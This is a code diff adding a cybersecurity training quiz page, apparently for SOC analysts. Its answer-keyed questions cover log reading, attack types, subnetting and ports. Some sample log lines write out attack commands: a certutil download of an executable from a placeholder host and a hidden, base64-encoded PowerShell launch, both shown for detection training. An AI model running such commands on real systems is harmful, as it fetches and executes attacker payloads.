+    {q:"Hundreds of 4625 for 'admin' from 185.x.x.x, then a 4624 Logon Type 3 for 'admin' from the same IP. FIRST step?",a:["Treat 'admin' as compromised: disable/reset it and investigate what that session did","Block 185.x.x.x and close the ticket","Enable account lockout policy","Ignore it, the login was legitimate"],why:"The brute force succeeded. Blocking the IP is a side step: the attacker has valid credentials and can come from another IP.",tag:"Contain the right thing"},
+    {q:"Sysmon 1: parent winword.exe → powershell.exe -nop -w hidden -enc SQBFAFgA... What's happening?",a:["A malicious macro launching hidden, encoded PowerShell (likely a downloader)","A normal Office update","A user running a script manually","A Windows Defender scan"],why:"Office should never spawn PowerShell. -enc = base64 encoded, -w hidden = no window. Decode it to find the next stage."},
+    {q:"DNS logs: thousands of queries like aGVsbG8gd29y.x7k2.badsite.com, all unique subdomains, TXT records. What is it?",a:["DNS tunneling / data exfiltration","DNS zone transfer","DDoS amplification","Normal CDN traffic"],why:"Long random/base64 subdomains, high volume to one domain and TXT records are the signature."},
+    {q:"Firewall log: 10.0.5.23 connects to 10.0.5.1 through 10.0.5.254 on port 445, all within 20 seconds. FIRST step?",a:["Isolate 10.0.5.23 via EDR and investigate it","Block port 445 for the whole network","Isolate all hosts it connected to","Shut down the file servers"],why:"Internal SMB sweep = scanning or worm-like lateral movement. The scanning host is the problem, not its targets.",tag:"Contain the right thing"},
+    {q:"Linux auth.log: many 'Failed password for root from 45.x.x.x', then 'Accepted password for root from 45.x.x.x'. What does it tell you?",a:["SSH brute force succeeded, and root login over SSH with passwords was allowed","Normal admin activity","A failed attack, nothing to do","A Windows Kerberos issue"],why:"Contain the host, then fix: disable root SSH login, use keys, add fail2ban and MFA. Harden after containment."},
+    {q:"Event 4769: one user requests service tickets for 40 different SPNs in 2 minutes, encryption type 0x17 (RC4). What is it?",a:["Kerberoasting","Golden Ticket","Pass-the-Hash","Password spraying"],why:"RC4 tickets are easier to crack offline. Defense: strong service account passwords or gMSA, AES only.",tag:"Name the attack"},
+    {q:"Process log: certutil.exe -urlcache -split -f http://x.x/a.exe C:\\Users\\Public\\a.exe. What is it?",a:["Living off the land: abusing a built-in tool (LOLBin) to download a payload","A certificate renewal","A Windows update","Normal browser download"],why:"Attackers use trusted Windows binaries to avoid detection. Other common LOLBins: bitsadmin, mshta, rundll32."}
+  ];
+  var QSOSI=[
+    {q:"ARP spoofing / poisoning attacks which OSI layer?",a:["Layer 2 – Data Link","Layer 3 – Network","Layer 4 – Transport","Layer 7 – Application"],why:"ARP maps IP to MAC inside the LAN. Defense: Dynamic ARP Inspection."},
+    {q:"MAC flooding (filling the switch's CAM table) is which layer?",a:["Layer 2 – Data Link","Layer 1 – Physical","Layer 3 – Network","Layer 4 – Transport"],why:"The switch fails open and broadcasts traffic like a hub, so the attacker can sniff. Defense: port security."},
+    {q:"VLAN hopping is which layer?",a:["Layer 2 – Data Link","Layer 3 – Network","Layer 5 – Session","Layer 7 – Application"],why:"Switch spoofing or double tagging. Defense: disable DTP, don't use the native VLAN for users."},
+    {q:"IP spoofing is which layer?",a:["Layer 3 – Network","Layer 2 – Data Link","Layer 4 – Transport","Layer 6 – Presentation"],why:"Forging the source IP. It's the base for reflection/amplification attacks, and why blocking IPs alone is weak."},
+    {q:"Ping flood / Smurf attack (ICMP) is which layer?",a:["Layer 3 – Network","Layer 4 – Transport","Layer 2 – Data Link","Layer 7 – Application"],why:"ICMP works at the network layer. Smurf = spoofed ICMP to a broadcast address."},
+    {q:"SYN flood is which layer?",a:["Layer 4 – Transport","Layer 3 – Network","Layer 7 – Application","Layer 5 – Session"],why:"Abuses the TCP handshake by leaving half-open connections. Defense: SYN cookies.",tag:"Precision"},
+    {q:"UDP flood is which layer?",a:["Layer 4 – Transport","Layer 3 – Network","Layer 2 – Data Link","Layer 7 – Application"],why:"Floods random UDP ports, forcing ICMP unreachable replies. Volumetric."},
+    {q:"Session hijacking (stealing a session cookie/token) is usually taught as which layer?",a:["Layer 5 – Session","Layer 3 – Network","Layer 1 – Physical","Layer 2 – Data Link"],why:"Textbook answer is Session. In real life the cookie lives in HTTP (L7), so mention both if asked to explain."},
+    {q:"SSL stripping (downgrading HTTPS to HTTP) is usually taught as which layer?",a:["Layer 6 – Presentation","Layer 2 – Data Link","Layer 4 – Transport","Layer 1 – Physical"],why:"Encryption is classically Presentation-layer. Defense: HSTS. Some sources say L7, so explain your reasoning."},
+    {q:"SQL injection and XSS are which layer?",a:["Layer 7 – Application","Layer 4 – Transport","Layer 6 – Presentation","Layer 3 – Network"],why:"They target the web application itself. That's why you need a WAF, not a regular L3/L4 firewall."},
+    {q:"HTTP flood / Slowloris is which layer?",a:["Layer 7 – Application","Layer 4 – Transport","Layer 3 – Network","Layer 2 – Data Link"],why:"Looks like legit requests, so it's hard to filter by volume. Slowloris holds connections open with slow headers.",tag:"Read the clue"},
+    {q:"DNS spoofing / cache poisoning is which layer?",a:["Layer 7 – Application","Layer 3 – Network","Layer 2 – Data Link","Layer 5 – Session"],why:"DNS is an application-layer protocol. Defense: DNSSEC."},
+    {q:"Wiretapping, cutting cables or jamming Wi-Fi is which layer?",a:["Layer 1 – Physical","Layer 2 – Data Link","Layer 3 – Network","Layer 7 – Application"],why:"Physical security is security too: locked server rooms, cameras, access control."}
+  ];
+  function pick(arr,idx){return idx.map(function(i){return arr[i]})}
+  function rg(a,b){var r=[];for(var i=a;i<=b;i++)r.push(i);return r}
+  var TOPICS=[
+    {k:'ip',label:'IP + DHCP + subnets',list:pick(QS,rg(0,8).concat([17,18,20])).concat(pick(QSW,[12,13,14].concat(rg(16,27))))},
+    {k:'arp',label:'ARP + spoofing',list:pick(QS,rg(9,16).concat([19])).concat(pick(QSW,rg(28,32)))},
+    {k:'osi',label:'OSI + TCP/UDP',list:pick(QS2,rg(0,5).concat([9]))},
+    {k:'aosi',label:'Attack → OSI layer',list:QSOSI},
+    {k:'dns',label:'DNS',list:pick(QS2,[6,7,8]).concat(pick(QSW,rg(0,4).concat([33])),pick(QSCD,rg(3,6)))},
+    {k:'cry',label:'Crypto + encoding',list:pick(QSCD,[0,1,2])},
+    {k:'fw',label:'Firewalls, IDS, ports',list:pick(QS2,rg(10,21)).concat(QSFW,pick(QSW,[15,34,35]))},
+    {k:'ad',label:'Active Directory + Kerberos',list:QS3.concat(QSAD,pick(QSW,[36,37,38]))},
+    {k:'bf',label:'Brute force + DDoS',list:QSDD.concat(pick(QSW,[5,6,7]))},
+    {k:'web',label:'Web + WAF',list:QSWEB},
+    {k:'soc',label:'SOC core',list:QSSOC},
+    {k:'ph',label:'Phishing',list:QSPH},
+    {k:'ir',label:'IR + Kill Chain + MITRE',list:QSIR.concat(pick(QSW,[8,9,10,11]))},
+    {k:'log',label:'Read the log',list:QSLOG}
+  ];
+  var TKEY='socdrill-topics';
+  var sel=(function(){try{var v=JSON.parse(localStorage.getItem(TKEY));if(v&&v.keys&&v.keys.length)return v}catch(e){}return {keys:['log'],weak:false}})();
+  function saveSel(){try{localStorage.setItem(TKEY,JSON.stringify(sel))}catch(e){}}
+  var topicsOpen=false;
+  function selectedList(){
+    var out=[];TOPICS.forEach(function(t){if(sel.keys.indexOf(t.k)>=0)out=out.concat(t.list)});
+    if(sel.weak)out=out.filter(function(x){return !!x.tag});
+    return out;
+  }
+  var cs={deck:shuffle(selectedList()),i:0,missed:[],right:0};
+
+  function startDeck(list){cs={deck:shuffle(list),i:0,missed:[],right:0};topicsOpen=false;renderConcepts()}
+  function deckBar(){
+    var n=selectedList().length;
+    var names=TOPICS.filter(function(t){return sel.keys.indexOf(t.k)>=0}).map(function(t){return t.label});
+    var sum=(names.length===TOPICS.length?'All topics':names.length===1?names[0]:names.length+' topics')+(sel.weak?' · weak patterns':'')+' · '+n+' Q';
+    return '<details class="topicbox"'+(topicsOpen?' open':'')+'><summary>Topics: '+esc(sum)+'</summary>'+
+      '<div class="decks" role="group" aria-label="Topics">'+TOPICS.map(function(t){return '<button class="chip" data-t="'+t.k+'" aria-pressed="'+(sel.keys.indexOf(t.k)>=0)+'">'+esc(t.label)+' <span>'+t.list.length+'</span></button>'}).join('')+'</div>'+
+      '<div class="trow"><button class="mini" id="tAll">Select all</button><button class="mini" id="tNone">Clear</button>'+
+      '<button class="chip weakchip" id="tWeak" aria-pressed="'+sel.weak+'">Only my weak patterns</button></div>'+
+      '<button class="primary" id="tGo"'+(n?'':' disabled')+'>'+(n?'Start quiz · '+n+' questions':'Pick at least one topic')+'</button></details>';
+  }
+  function wireDecks(){
+    var box=view.querySelector('.topicbox'); if(!box)return;
+    box.addEventListener('toggle',function(){topicsOpen=box.open});
+    function refresh(){saveSel();topicsOpen=true;var old=view.querySelector('.topicbox');var tmp=document.createElement('div');tmp.innerHTML=deckBar();old.replaceWith(tmp.firstChild);wireDecks()}
+    box.querySelectorAll('.chip[data-t]').forEach(function(b){b.onclick=function(){
+      var k=b.dataset.t,i=sel.keys.indexOf(k); if(i>=0)sel.keys.splice(i,1); else sel.keys.push(k); refresh()}});
+    document.getElementById('tAll').onclick=function(){sel.keys=TOPICS.map(function(t){return t.k});refresh()};
+    document.getElementById('tNone').onclick=function(){sel.keys=[];refresh()};
+    document.getElementById('tWeak').onclick=function(){sel.weak=!sel.weak;refresh()};
+    document.getElementById('tGo').onclick=function(){saveSel();startDeck(selectedList())};
+  }
+
+  function renderConcepts(){
+    if(cs.i>=cs.deck.length){
+      var n=cs.deck.length;
+      view.innerHTML='<div class="done"><p class="progress">Round finished</p><p class="big">'+cs.right+'/'+n+'</p><p class="hint">'+(cs.missed.length?'You missed '+cs.missed.length+'. Run them again until they stick.':'Clean sweep. Try the subnet drill next.')+'</p></div>'+
+        (cs.missed.length?'<button class="primary" id="redo">Review the ones I missed</button>':'')+
+        '<button class="'+(cs.missed.length?'secondary':'primary')+'" id="again">Start a new round</button>';
+      view.innerHTML=deckBar()+view.innerHTML; wireDecks();
+      var r=document.getElementById('redo'); if(r) r.onclick=function(){startDeck(cs.missed)};
+      document.getElementById('again').onclick=function(){startDeck(selectedList())};
+      return;
+    }
+    var item=cs.deck[cs.i];
+    var opts=shuffle(item.a.map(function(t,k){return {t:t,ok:k===0}}));
+    view.innerHTML=deckBar()+'<p class="progress">Question '+(cs.i+1)+' of '+cs.deck.length+(item.tag?' <span class="tag">'+esc(item.tag)+'</span>':'')+'</p><h2 class="q">'+esc(item.q)+'</h2><div class="opts">'+
+      opts.map(function(o,k){return '<button class="opt" data-k="'+k+'">'+esc(o.t)+'</button>'}).join('')+'</div><div id="after"></div>';
+    wireDecks();
+    var btns=view.querySelectorAll('.opt');
+    btns.forEach(function(b){b.onclick=function(){
+      var k=+b.dataset.k, ok=opts[k].ok;
+      btns.forEach(function(x,j){x.disabled=true; if(opts[j].ok) x.classList.add('right')});
+      if(!ok){b.classList.add('wrong'); cs.missed.push(item)} else cs.right++;
+      record(ok);
+      document.getElementById('after').innerHTML='<div class="why"><p><strong>'+(ok?'Correct.':'Not quite.')+'</strong> '+esc(item.why)+'</p>'+(item.more?'<p>'+esc(item.more)+'</p>':'')+'</div><button class="primary" id="next">Next question</button>';
+      var nx=document.getElementById('next'); nx.focus(); nx.onclick=function(){cs.i++;renderConcepts()};
+    }});
+  }
+
+  /* ---------------- Subnets ---------------- */
+  function genSubnet(){
+    var bases=[[10,rnd(256),rnd(256)],[172,16+rnd(16),rnd(256)],[192,168,rnd(256)]];
+    var base=bases[rnd(3)];
+    var ps=[24,25,26,26,27,27,28,28,29,30];
+    var p=ps[rnd(ps.length)], b=Math.pow(2,32-p);
+    var h=rnd(256), net=Math.floor(h/b)*b, bc=net+b-1;
+    if(h===net||h===bc) h=net+1+rnd(b-2);
+    return {pre:base.join('.')+'.',p:p,b:b,h:h,net:net,bc:bc,first:net+1,last:bc-1,hosts:b-2};
+  }
+  var sq=genSubnet();
+
+  function num(v){v=String(v).trim(); if(!v) return NaN; return parseInt(v.split('.').pop().replace('/',''),10)}
+
+  function fieldHTML(id,label,pre){
+    return '<div class="field"><label for="'+id+'">'+label+'</label><div class="inbox" id="box-'+id+'">'+(pre?'<span class="pre mono">'+esc(pre)+'</span>':'')+
+      '<input id="'+id+'" inputmode="numeric" autocomplete="off" enterkeyhint="next"></div></div>';
+  }
+
+  function renderSubnets(){
+    var s=sq;
+    view.innerHTML='<p class="progress">Find all four answers</p><p class="prompt mono">'+s.pre+s.h+'/'+s.p+'</p><p class="hint">Block size, count, locate, read.</p>'+
+      fieldHTML('f-net','Network ID',s.pre)+fieldHTML('f-bc','Broadcast',s.pre)+fieldHTML('f-first','First usable',s.pre)+fieldHTML('f-last','Last usable',s.pre)+fieldHTML('f-hosts','Usable hosts','')+
+      '<button class="primary" id="check">Check my answers</button><div id="after"></div>'+TABLE;
+    wireEnter(['f-net','f-bc','f-first','f-last','f-hosts']);
+    document.getElementById('check').onclick=checkSubnet;
+  }
+
+  function wireEnter(ids){
+    ids.forEach(function(id,k){document.getElementById(id).addEventListener('keydown',function(e){
+      if(e.key==='Enter'){e.preventDefault(); if(k<ids.length-1) document.getElementById(ids[k+1]).focus(); else document.getElementById('check').click()}
+    })});
+  }
+
+  function mark(id,ok,fix){
+    var box=document.getElementById('box-'+id); box.classList.remove('right','wrong'); box.classList.add(ok?'right':'wrong');
+    box.querySelector('input').readOnly=true;
+    if(!ok){var d=document.createElement('div'); d.className='fix'; d.textContent='Answer: '+fix; box.parentNode.appendChild(d)}
+  }
+
+  function checkSubnet(){
+    var s=sq, all=true;
+    [['f-net',s.net,s.pre+s.net],['f-bc',s.bc,s.pre+s.bc],['f-first',s.first,s.pre+s.first],['f-last',s.last,s.pre+s.last],['f-hosts',s.hosts,String(s.hosts)]].forEach(function(f){
+      var ok=num(document.getElementById(f[0]).value)===f[1]; if(!ok) all=false; mark(f[0],ok,f[2]);
+    });
+    record(all);
+    var starts=[]; for(var x=s.net-2*s.b;x<=s.net+2*s.b;x+=s.b){ if(x>=0&&x<=256) starts.push(x===s.net?'<strong>'+x+'</strong>':x) }
+    var cells='';
+    for(var i=0;i<256;i++){
+      var c='cell'; if(Math.floor(i/s.b)%2) c+=' alt';
+      if(i>=s.net&&i<=s.bc) c+=' in';
+      if(i===s.net) c+=' net'; if(i===s.bc) c+=' bc'; if(i===s.h) c+=' me';
+      cells+='<div class="'+c+'"></div>';
+    }
+    document.getElementById('check').remove();
+    document.getElementById('after').innerHTML=
+      '<div class="why"><p><strong>'+(all?'All correct.':'Check the red fields.')+'</strong></p></div>'+
+      '<ol class="steps"><li><span class="mono">/'+s.p+'</span> means blocks of <strong>'+s.b+'</strong>.</li>'+
+      '<li>Count in '+s.b+'s: '+starts.join(', ')+'.</li>'+
+      '<li>House '+s.h+' sits in the <span class="mono">'+s.net+'\u2013'+s.bc+'</span> neighborhood.</li>'+
+      '<li>First = network <span class="mono">.'+s.net+'</span>, last = broadcast <span class="mono">.'+s.bc+'</span>, usable <span class="mono">.'+s.first+'\u2013.'+s.last+'</span>, '+s.b+' \u2212 2 = '+s.hosts+' hosts.</li></ol>'+
+      '<div class="street"><h3>The street, 0 to 255</h3><p class="cap">Each square is one address in the last octet. Shading alternates per neighborhood.</p><div class="grid" aria-hidden="true">'+cells+'</div>'+
+      '<div class="legend"><span><i style="background:var(--in)"></i>Your neighborhood</span><span><i style="background:var(--mark)"></i>Network ID and broadcast</span><span><i style="background:var(--block-a);box-shadow:0 0 0 2px var(--bad)"></i>Your host</span></div></div>'+
+      '<button class="primary" id="next">Next address</button>';
+    var nx=document.getElementById('next'); nx.onclick=function(){sq=genSubnet();renderSubnets(); document.getElementById('f-net').focus()};
+  }
+
+  /* ---------------- Masks ---------------- */
+  function genMask(){
+    var t=rnd(3), p=25+rnd(6);
+    if(Math.random()<.15) p=24;
+    if(t===2){var n=3+rnd(250); var q=30; while(Math.pow(2,32-q)-2<n) q--; return {t:2,n:n,p:q}}
+    return {t:t,p:p};
+  }
+  var mq=genMask();
+
+  function renderMasks(){
+    var m=mq, h='';
+    if(m.t===0){
+      h='<p class="progress">Mask to CIDR</p><p class="prompt mono">255.255.255.'+MASK[m.p]+'</p><p class="hint">What prefix is this, and how many usable hosts?</p>'+
+        fieldHTML('m-a','CIDR','/')+fieldHTML('m-b','Usable hosts','');
+    } else if(m.t===1){
+      h='<p class="progress">CIDR to mask</p><p class="prompt mono">/'+m.p+'</p><p class="hint">Write the mask and the usable hosts.</p>'+
+        fieldHTML('m-a','Mask','255.255.255.')+fieldHTML('m-b','Usable hosts','');
+    } else {
+      h='<p class="progress">Size it</p><p class="prompt">'+m.n+' hosts</p><p class="hint">What\u2019s the smallest subnet that fits them?</p>'+
+        fieldHTML('m-a','CIDR','/');
+    }
+    view.innerHTML=h+'<button class="primary" id="check">Check my answers</button><div id="after"></div>'+TABLE;
+    var ids=m.t===2?['m-a']:['m-a','m-b'];
+    wireEnter(ids);
+    document.getElementById('check').onclick=checkMask;
+  }
+
+  function checkMask(){
+    var m=mq, b=Math.pow(2,32-m.p), all=true, exp;
+    if(m.t===0){
+      var a=num(document.getElementById('m-a').value)===m.p, c=num(document.getElementById('m-b').value)===b-2;
+      mark('m-a',a,'/'+m.p); mark('m-b',c,String(b-2)); all=a&&c;
+      exp='Last octet '+MASK[m.p]+' is the /'+m.p+' row. The three 255s are 24 bits, and '+MASK[m.p]+' adds '+(m.p-24)+' more. Block '+b+', so '+(b-2)+' usable.';
+    } else if(m.t===1){
+      var a1=num(document.getElementById('m-a').value)===MASK[m.p], c1=num(document.getElementById('m-b').value)===b-2;
+      mark('m-a',a1,'255.255.255.'+MASK[m.p]); mark('m-b',c1,String(b-2)); all=a1&&c1;
+      exp='/'+m.p+' gives blocks of '+b+'. Mask last octet = 256 \u2212 '+b+' = '+MASK[m.p]+'. Usable = '+b+' \u2212 2 = '+(b-2)+'.';
+    } else {
+      all=num(document.getElementById('m-a').value)===m.p; mark('m-a',all,'/'+m.p);
+      var smaller=m.p<30?' A /'+(m.p+1)+' only fits '+(b/2-2)+'.':'';
+      exp='/'+m.p+' gives '+(b-2)+' usable hosts, which fits '+m.n+'.'+smaller;
+    }
+    record(all);
+    document.getElementById('check').remove();
+    document.getElementById('after').innerHTML='<div class="why"><p><strong>'+(all?'Correct.':'Not quite.')+'</strong> '+exp+'</p></div><button class="primary" id="next">Next question</button>';
+    var nx=document.getElementById('next'); nx.focus(); nx.onclick=function(){mq=genMask();renderMasks(); document.getElementById('m-a').focus()};
+  }
+
+
+  /* ---------------- Ports ---------------- */
+  var PORTS=[['20/21','FTP'],['22','SSH'],['23','Telnet'],['25','SMTP'],['53','DNS'],['67/68','DHCP'],['80','HTTP'],['88','Kerberos'],['110','POP3'],['143','IMAP'],['389','LDAP'],['636','LDAPS'],['443','HTTPS'],['445','SMB'],['3389','RDP']];
+  var PNOTE={'Telnet':'Cleartext, so credentials can be sniffed.','DNS':'UDP normally, TCP for big replies and zone transfers.','DHCP':'UDP, server 67 and client 68.','Kerberos':'Active Directory authentication. Tomorrow\u2019s topic.','SMB':'File sharing, and a classic lateral movement path (WannaCry).','RDP':'Remote desktop. Never expose it to the internet.','LDAPS':'LDAP over TLS.','FTP':'Cleartext. 21 control, 20 data.'};
+  function genPort(){var i=rnd(PORTS.length),dir=rnd(2),wrong=shuffle(PORTS.filter(function(x,j){return j!==i})).slice(0,3);return {p:PORTS[i],dir:dir,wrong:wrong}}
+  var pq=genPort();
+  function renderPorts(){
+    var m=pq, ask=m.dir?m.p[1]:m.p[0], col=m.dir?0:1;
+    var opts=shuffle([{t:m.p[col],ok:true}].concat(m.wrong.map(function(w){return {t:w[col],ok:false}})));
+    view.innerHTML='<p class="progress">'+(m.dir?'Which port?':'Which service?')+'</p><p class="prompt'+(m.dir?'':' mono')+'">'+esc(ask)+'</p><div class="opts">'+
+      opts.map(function(o,k){return '<button class="opt'+(m.dir?' mono':'')+'" data-k="'+k+'">'+esc(o.t)+'</button>'}).join('')+'</div><div id="after"></div>';
+    var btns=view.querySelectorAll('.opt');
+    btns.forEach(function(b){b.onclick=function(){
+      var ok=opts[+b.dataset.k].ok;
+      btns.forEach(function(x,j){x.disabled=true; if(opts[j].ok) x.classList.add('right')});
+      if(!ok) b.classList.add('wrong');
+      record(ok);
+      var note=PNOTE[m.p[1]];
+      document.getElementById('after').innerHTML='<div class="why"><p><strong>'+(ok?'Correct.':'Not quite.')+'</strong> '+esc(m.p[1])+' is port '+esc(m.p[0])+'.'+(note?' '+esc(note):'')+'</p></div><button class="primary" id="next">Next port</button>';
+      var nx=document.getElementById('next'); nx.focus(); nx.onclick=function(){pq=genPort();renderPorts()};
+    }});
+  }
+
+  /* ---------------- Tabs ---------------- */
+  function render(){ paintScore(); if(mode==='concepts') renderConcepts(); else if(mode==='subnets') renderSubnets(); else if(mode==='ports') renderPorts(); else renderMasks(); }
+  document.querySelectorAll('.tabs button').forEach(function(b){b.onclick=function(){
+    mode=b.dataset.mode;
+    document.querySelectorAll('.tabs button').forEach(function(x){x.setAttribute('aria-selected',x===b?'true':'false')});
+    render();
+  }});
+  document.getElementById('reset').onclick=function(){ if(confirm('Reset all your scores?')){stats=fresh();save();paintScore()} };
+  render();
+})();
+</script>
+</body>
+</html>
